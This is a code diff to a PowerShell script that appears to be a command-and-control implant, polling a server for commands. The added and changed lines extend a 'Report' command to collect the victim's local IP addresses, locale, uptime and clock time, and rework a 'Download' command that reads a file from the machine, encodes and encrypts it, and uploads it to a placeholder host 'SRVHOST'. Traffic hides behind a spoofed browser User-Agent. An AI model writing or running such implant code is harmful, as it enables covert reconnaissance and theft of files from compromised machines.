@@ -58,6 +58,7 @@ $arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
 $os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
 $domain = (Get-WmiObject Win32_ComputerSystem).Domain;
 
+
 # format the headers
 $raw_header = "$final_hostname,$whoami,$os,$pid,$domain";
 
@@ -78,7 +79,12 @@ while($true){
 
     }elseif($fc -eq "Report"){
       $ps = foreach ($i in Get-Process){$i.ProcessName};
+      $local_ips = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected" }).IPv4Address.IPAddress;$arr = $local_ips.split("\n");
+      $ps+= $arr -join ";"
       $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
+      $ps+= (Get-WinSystemLocale).Name
+      $ps+= ((get-date) - (gcim Win32_OperatingSystem).LastBootUpTime).TotalHours
+      $ps+= Get-Date -Format "HH:mm(MM/dd/yyyy)"
       $pst = EncryptCommand $key $ps
       $wcr.Headers.add("Authorization",$pst);
       $wcr.Headers.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
@@ -87,9 +93,10 @@ while($true){
     }
     elseif($fc.split(" ")[0] -eq "Download"){
       $filename = EncryptCommand $key $fc.split("\")[-1]
-      $file_content = (Get-Content $fc.split(" ")[1] -Encoding byte)
-      $file_base64 =[Convert]::ToBase64String($Bytes)
-      $efc = EncryptCommand $key $file_base64
+      $file_content = Get-Content $fc.split(" ")[1]
+      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($file_content)
+      $EncodedText =[Convert]::ToBase64String($Bytes)
+      $efc = EncryptCommand $key $EncodedText
       $wc3 = new-object net.WebClient
       $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
       $wc3.UploadString("http://SRVHOST/OCT_file_receiver", "fn=$filename&token=$efc")
